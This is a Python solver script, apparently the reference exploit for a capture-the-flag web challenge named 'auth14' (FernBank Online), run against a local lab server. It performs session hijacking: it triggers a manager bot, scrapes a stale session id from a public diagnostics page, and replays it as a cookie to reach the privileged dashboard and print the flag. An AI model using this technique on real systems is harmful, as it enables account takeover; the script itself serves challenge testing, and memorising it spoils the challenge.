#!/usr/bin/env python3
"""Reference exploit for auth14 (FernBank Online).

The app signs every visitor in as an ordinary customer, so the first visit
hands back your own session id. Trigger the nightly manager probe (which
signs in then "logs out" -- but only clears its own cookie), read its
now-stale session id off the public diagnostics page, and pivot: present
that higher-privilege id as your own cookie to the dashboard.
"""
import re
import sys

import requests  # pip install requests

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8073"


def wait_up(s: requests.Session) -> None:
    import time
    for _ in range(30):
        try:
            s.get(BASE, timeout=2)
            return
        except requests.RequestException:
            time.sleep(1)


def main() -> int:
    s = requests.Session()
    wait_up(s)

    # First visit: the bank signs you in as a personal-banking customer and
    # shows you your own session id. That session must NOT carry the flag.
    r = s.get(f"{BASE}/dashboard", timeout=5)
    mine = s.cookies.get("sid")
    if not mine:
        sys.stderr.write("no session cookie was issued to the visitor\n")
        return 1
    if "flag{" in r.text:
        sys.stderr.write("precondition failed: customer dashboard leaks the flag\n")
        return 1
    if "personal banking customer" not in r.text:
        sys.stderr.write("expected the customer view on the first dashboard visit\n")
        return 1

    s.post(f"{BASE}/bot/manager-shift-report", timeout=5)

    diag = s.get(f"{BASE}/diagnostics", timeout=5).text
    sids = re.findall(r"<td>([0-9a-f]{32})</td>", diag)
    if not sids:
        sys.stderr.write("no session id found on /diagnostics\n")
        return 1

    # Pivot: swap your cookie for the manager's (supposedly logged-out)
    # session id. In a browser this is "edit the sid cookie's value in
    # devtools"; here it is a fresh request carrying only that id -- note
    # requests' session jar would keep winning over per-request cookies,
    # so the swap must actually replace the value.
    for sid in reversed(sids):  # most recent first
        if sid == mine:
            continue
        r = requests.get(f"{BASE}/dashboard", timeout=5, cookies={"sid": sid})
        m = re.search(r"flag\{[^}]+\}", r.text)
        if m:
            print(m.group(0))
            return 0

    sys.stderr.write("no flag found\n")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
